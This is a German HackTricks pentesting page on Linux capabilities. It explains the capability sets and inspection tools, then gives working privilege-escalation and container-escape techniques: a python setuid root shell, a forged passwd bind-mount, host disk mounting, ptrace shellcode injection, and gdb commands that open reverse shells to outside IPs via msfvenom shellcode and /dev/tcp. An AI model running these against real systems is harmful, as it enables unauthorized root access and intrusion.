# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities teilen **root-Berechtigungen in kleinere, voneinander getrennte Einheiten** auf, sodass Prozesse eine Teilmenge der Berechtigungen erhalten können. Dadurch werden Risiken minimiert, da nicht unnötigerweise vollständige root-Berechtigungen vergeben werden.

### Das Problem:

- Normale Benutzer verfügen über eingeschränkte Berechtigungen, was Aufgaben wie das Öffnen eines Netzwerk-Sockets beeinträchtigt, für das root-Zugriff erforderlich ist.

### Capability-Sets:

1. **Inherited (CapInh)**:

- **Zweck**: Bestimmt die vom übergeordneten Prozess weitergegebenen Capabilities.
- **Funktionsweise**: Wenn ein neuer Prozess erstellt wird, übernimmt er die Capabilities seines übergeordneten Prozesses aus diesem Set. Dies ist nützlich, um bestimmte Berechtigungen über das Erstellen von Prozessen hinweg beizubehalten.
- **Einschränkungen**: Ein Prozess kann keine Capabilities erhalten, die sein übergeordneter Prozess nicht besaß.

2. **Effective (CapEff)**:

- **Zweck**: Stellt die Capabilities dar, die ein Prozess zu einem bestimmten Zeitpunkt tatsächlich verwendet.
- **Funktionsweise**: Dies ist das Set, das vom Kernel geprüft wird, um Berechtigungen für verschiedene Vorgänge zu gewähren. Bei Dateien kann dieses Set ein Flag sein, das angibt, ob die erlaubten Capabilities der Datei als effektiv betrachtet werden sollen.
- **Bedeutung**: Das Effective-Set ist für sofortige Berechtigungsprüfungen entscheidend und fungiert als aktives Set der Capabilities, die ein Prozess verwenden kann.

3. **Permitted (CapPrm)**:

- **Zweck**: Definiert die maximale Menge an Capabilities, die ein Prozess besitzen kann.
- **Funktionsweise**: Ein Prozess kann eine Capability aus dem Permitted-Set in sein Effective-Set übernehmen und erhält dadurch die Möglichkeit, diese Capability zu verwenden. Er kann Capabilities auch aus seinem Permitted-Set entfernen.
- **Grenze**: Es fungiert als Obergrenze für die Capabilities, die ein Prozess besitzen kann, und stellt sicher, dass ein Prozess seinen vordefinierten Berechtigungsumfang nicht überschreitet.

4. **Bounding (CapBnd)**:

- **Zweck**: Setzt eine Obergrenze für die Capabilities, die ein Prozess während seines gesamten Lebenszyklus erwerben kann.
- **Funktionsweise**: Selbst wenn ein Prozess eine bestimmte Capability in seinem Inheritable- oder Permitted-Set besitzt, kann er diese Capability nicht erwerben, sofern sie sich nicht auch im Bounding-Set befindet.
- **Anwendungsfall**: Dieses Set ist besonders nützlich, um das Potenzial eines Prozesses zur Privilege Escalation einzuschränken, und fügt eine zusätzliche Sicherheitsebene hinzu.

5. **Ambient (CapAmb)**:
- **Zweck**: Ermöglicht es, bestimmte Capabilities über einen `execve`-Systemaufruf hinweg beizubehalten, der normalerweise zu einer vollständigen Zurücksetzung der Capabilities eines Prozesses führen würde.
- **Funktionsweise**: Stellt sicher, dass Nicht-SUID-Programme ohne zugehörige File Capabilities bestimmte Berechtigungen beibehalten können.
- **Einschränkungen**: Capabilities in diesem Set unterliegen den Einschränkungen der Inheritable- und Permitted-Sets, wodurch sichergestellt wird, dass sie die zulässigen Berechtigungen des Prozesses nicht überschreiten.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Für weitere Informationen siehe:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capabilities von Prozessen und Binaries

### Capabilities von Prozessen

Um die Capabilities eines bestimmten Prozesses anzuzeigen, verwende die Datei **status** im Verzeichnis /proc. Da sie weitere Details enthält, beschränken wir uns nur auf die Informationen bezüglich der Linux-Capabilities.\
Beachte, dass für alle laufenden Prozesse die Capability-Informationen pro Thread verwaltet werden. Bei Binaries im Dateisystem werden sie in extended attributes gespeichert.

Die definierten Capabilities findest du in /usr/include/linux/capability.h

Die Capabilities des aktuellen Prozesses kannst du mit `cat /proc/self/status` oder durch Ausführen von `capsh --print` anzeigen. Die Capabilities anderer Benutzer findest du in `/proc/<pid>/status`.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Dieser Befehl sollte auf den meisten Systemen 5 Zeilen zurückgeben.

- CapInh = Geerbte Capabilities
- CapPrm = Erlaubte Capabilities
- CapEff = Effektive Capabilities
- CapBnd = Bounding Set
- CapAmb = Ambient-Capabilities-Set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Diese Hexadezimalzahlen ergeben keinen Sinn. Mit dem Dienstprogramm capsh können wir sie in die Namen der Capabilities dekodieren.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Überprüfen wir nun die von `ping` verwendeten **capabilities**:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Obwohl das funktioniert, gibt es noch einen anderen und einfacheren Weg. Um die Capabilities eines laufenden Prozesses anzuzeigen, verwenden Sie einfach das Tool **getpcaps**, gefolgt von dessen Prozess-ID (PID). Sie können auch eine Liste von Prozess-IDs angeben.
```bash
getpcaps 1234
```
Prüfen wir hier die capabilities von `tcpdump`, nachdem dem Binary genügend capabilities (`cap_net_admin` und `cap_net_raw`) zum Mitschneiden des Netzwerkverkehrs zugewiesen wurden (_tcpdump läuft im Prozess 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Wie du sehen kannst, entsprechen die angegebenen Capabilities den Ergebnissen der beiden Methoden zum Abrufen der Capabilities einer Binary.\
Das Tool _getpcaps_ verwendet den **capget()**-Systemaufruf, um die verfügbaren Capabilities für einen bestimmten Thread abzufragen. Dieser Systemaufruf benötigt lediglich die PID, um weitere Informationen abzurufen.

### Capabilities von Binaries

Binaries können Capabilities besitzen, die während der Ausführung verwendet werden können. Beispielsweise findet man sehr häufig eine `ping`-Binary mit der Capability `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Du kannst **Binärdateien mit Capabilities** mit Folgendem durchsuchen:
```bash
getcap -r / 2>/dev/null
```
### Capabilities mit capsh entfernen

Wenn wir die CAP*NET_RAW capabilities für \_ping* entfernen, sollte das ping-Tool nicht mehr funktionieren.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Neben der Ausgabe von _capsh_ sollte auch der _tcpdump_-Befehl selbst einen Fehler auslösen.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Der Fehler zeigt eindeutig, dass der ping-Befehl keinen ICMP-Socket öffnen darf. Nun wissen wir sicher, dass dies wie erwartet funktioniert.

### Capabilities entfernen

Du kannst die Capabilities einer Binärdatei entfernen mit
```bash
setcap -r </path/to/binary>
```
## Capabilities von Benutzern

Anscheinend **ist es möglich, Capabilities auch Benutzern zuzuweisen**. Das bedeutet wahrscheinlich, dass jeder vom Benutzer ausgeführte Prozess die Capabilities des Benutzers verwenden kann.\
Basierend auf [diesem](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [diesem](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) und [diesem](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) müssen einige Dateien konfiguriert werden, um einem Benutzer bestimmte Capabilities zu geben. Die Datei, mit der die Capabilities für jeden Benutzer festgelegt werden, ist jedoch `/etc/security/capability.conf`.\
Beispieldatei:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Umgebungs-Capabilities

Durch das Kompilieren des folgenden Programms ist es möglich, eine **Bash-Shell innerhalb einer Umgebung mit Capabilities zu starten**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Innerhalb der **bash, die vom kompilierten ambient binary ausgeführt wird**, können die **neuen capabilities** beobachtet werden (ein regulärer Benutzer hat im Abschnitt „current“ keine capability).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Du kannst **nur Capabilities hinzufügen, die sowohl in den erlaubten als auch in den vererbbaren Sets vorhanden sind**.

### Capability-aware/Capability-dumb Binaries

Die **Capability-aware Binaries verwenden die neuen Capabilities**, die von der Umgebung bereitgestellt werden, nicht. **Capability-dumb Binaries verwenden** sie hingegen, da sie diese nicht ablehnen. Dadurch sind Capability-dumb Binaries innerhalb einer speziellen Umgebung gefährdet, die Binaries Capabilities gewährt.

## Service-Capabilities

Standardmäßig verfügt ein **als root ausgeführter Service über alle zugewiesenen Capabilities**, was in manchen Fällen gefährlich sein kann.\
Daher kann eine **Service-Konfigurationsdatei** die **Capabilities festlegen**, die der Service haben soll, **sowie den Benutzer**, der den Service ausführen soll, um zu vermeiden, dass ein Service mit unnötigen Berechtigungen ausgeführt wird:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities in Docker-Containern

Standardmäßig weist Docker den Containern einige Capabilities zu. Welche Capabilities das sind, lässt sich sehr einfach mit folgendem Befehl überprüfen:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities sind nützlich, wenn du **deine eigenen Prozesse nach der Ausführung privilegierter Operationen einschränken möchtest** (z. B. nach dem Einrichten von chroot und dem Binden an einen Socket). Sie können jedoch ausgenutzt werden, indem man ihnen bösartige Befehle oder Argumente übergibt, die anschließend als root ausgeführt werden.

Mit `setcap` kannst du Capabilities für Programme erzwingen und mit `getcap` abfragen:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Das `+ep` bedeutet, dass du die Capability („-“ würde sie entfernen) als Effective und Permitted hinzufügst.

Um Programme in einem System oder Ordner mit Capabilities zu identifizieren:
```bash
getcap -r / 2>/dev/null
```
### Exploitation-Beispiel

Im folgenden Beispiel wird festgestellt, dass das Binary `/usr/bin/python2.6` für eine privesc-Schwachstelle anfällig ist:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities**, die von `tcpdump` benötigt werden, um **jedem Benutzer das Sniffen von Paketen zu ermöglichen**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Der Sonderfall von „leeren“ Capabilities

[Aus der Dokumentation](https://man7.org/linux/man-pages/man7/capabilities.7.html): Beachte, dass man einem Programmfile leere Capability-Sets zuweisen kann. Dadurch ist es möglich, ein set-user-ID-root-Programm zu erstellen, das die effektive und gespeicherte set-user-ID des Prozesses, der das Programm ausführt, auf 0 ändert, diesem Prozess jedoch keine Capabilities verleiht. Oder einfach ausgedrückt: Wenn du ein binary hast, das:

1. nicht root gehört
2. keine `SUID`-/`SGID`-Bits gesetzt hat
3. ein leeres Capability-Set besitzt (z. B. gibt `getcap myelf` `myelf =ep` zurück)

dann **wird dieses binary als root ausgeführt**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ist eine äußerst mächtige Linux-Capability, die aufgrund ihrer umfangreichen **administrativen Berechtigungen** oft mit einem nahezu vollständigen root-Level gleichgesetzt wird, etwa zum Mounten von Geräten oder zur Manipulation von Kernel-Features. Obwohl sie für Container, die vollständige Systeme simulieren, unverzichtbar ist, stellt **`CAP_SYS_ADMIN` erhebliche Sicherheitsprobleme dar**, insbesondere in containerisierten Umgebungen, da sie potenziell Privilege Escalation und eine Kompromittierung des Systems ermöglicht. Daher erfordert ihre Verwendung strenge Sicherheitsprüfungen und eine sorgfältige Verwaltung. Es sollte bevorzugt werden, diese Capability in anwendungsspezifischen Containern zu entfernen, um das **Prinzip der geringsten Rechte** einzuhalten und die Angriffsfläche zu minimieren.

**Beispiel mit binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Mit Python kann man eine modifizierte _passwd_-Datei über die echte _passwd_-Datei mounten:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Und schließlich **mount** die modifizierte `passwd`-Datei auf `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Und du wirst in der Lage sein, dich mit **`su`** als root anzumelden, wobei du das Passwort „password“ verwendest.

**Beispiel mit Umgebung (Docker breakout)**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Im vorherigen Output ist zu sehen, dass die SYS_ADMIN capability aktiviert ist.

- **Mount**

Dies ermöglicht es dem docker container, die **Festplatte des Hosts zu mounten und uneingeschränkt darauf zuzugreifen**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Vollständiger Zugriff**

Bei der vorherigen Methode konnten wir auf die Festplatte des Docker-Hosts zugreifen.\
Falls du feststellst, dass auf dem Host ein **ssh**-Server läuft, könntest du einen Benutzer auf der Festplatte des Docker-Hosts **erstellen** und über SSH darauf zugreifen:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Das bedeutet, dass du aus dem Container ausbrechen kannst, indem du einen Shellcode in einen Prozess injizierst, der innerhalb des Hosts läuft.** Um auf Prozesse zuzugreifen, die innerhalb des Hosts laufen, muss der Container mindestens mit **`--pid=host`** gestartet werden.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** gewährt die Möglichkeit, die von `ptrace(2)` bereitgestellten Debugging- und System-Call-Tracing-Funktionen sowie Cross-Memory-Attach-Aufrufe wie `process_vm_readv(2)` und `process_vm_writev(2)` zu verwenden. Obwohl diese Funktionen für Diagnose- und Monitoring-Zwecke leistungsfähig sind, kann die Aktivierung von `CAP_SYS_PTRACE` ohne restriktive Maßnahmen wie einen seccomp-Filter für `ptrace(2)` die Systemsicherheit erheblich beeinträchtigen. Insbesondere kann es ausgenutzt werden, um andere Sicherheitsbeschränkungen zu umgehen, vor allem solche, die durch seccomp auferlegt werden, wie anhand von [Proofs of Concept (PoC) wie diesem](https://gist.github.com/thejh/8346f47e359adecd1d53) gezeigt wird.

**Beispiel mit Binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Beispiel mit Binary (gdb)**

`gdb` mit `ptrace`-Capability:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Erstelle Shellcode mit msfvenom, um ihn über gdb in den Speicher zu injizieren
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debugge einen Root-Prozess mit gdb und füge die zuvor generierten gdb-Zeilen ein:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Beispiel mit Umgebung (Docker breakout) - Ein weiterer gdb Abuse**

Wenn **GDB** installiert ist (oder du es beispielsweise mit `apk add gdb` oder `apt install gdb` installieren kannst), kannst du **einen Prozess vom Host aus debuggen** und ihn die `system`-Funktion aufrufen lassen. (Diese Technik erfordert außerdem die Capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Du wirst die Ausgabe des ausgeführten Befehls nicht sehen können, aber er wird von diesem Prozess ausgeführt (also hole dir eine rev shell).

> [!WARNING]
> Wenn du den Fehler "No symbol "system" in current context." erhältst, sieh dir das vorherige Beispiel zum Laden eines Shellcodes in ein Programm über gdb an.

**Beispiel mit environment (Docker breakout) - Shellcode Injection**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**Prozesse** auf dem **Host** auflisten `ps -eaf`

1. Die **Architektur** ermitteln `uname -m`
2. Einen **Shellcode** für die Architektur finden ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Ein **Programm** finden, um den **Shellcode** in den Speicher eines Prozesses zu **injizieren** ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. Den **Shellcode** im Programm **modifizieren** und es kompilieren `gcc inject.c -o inject`
5. Ihn **injizieren** und deine **Shell** abrufen: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ermöglicht es einem Prozess, **Kernel-Module zu laden und zu entladen (`init_module(2)`, `finit_module(2)` und `delete_module(2)`-Systemaufrufe)**, und bietet direkten Zugriff auf die Kernoperationen des Kernels. Diese Fähigkeit stellt ein kritisches Sicherheitsrisiko dar, da sie Privilege Escalation und die vollständige Kompromittierung des Systems ermöglicht, indem Änderungen am Kernel vorgenommen werden. Dadurch können alle Linux-Sicherheitsmechanismen umgangen werden, einschließlich Linux Security Modules und der Container-Isolation.
**Das bedeutet, dass du** **Kernel-Module in den Kernel des Host-Rechners einfügen und daraus entfernen kannst.**

**Beispiel mit einer Binärdatei**

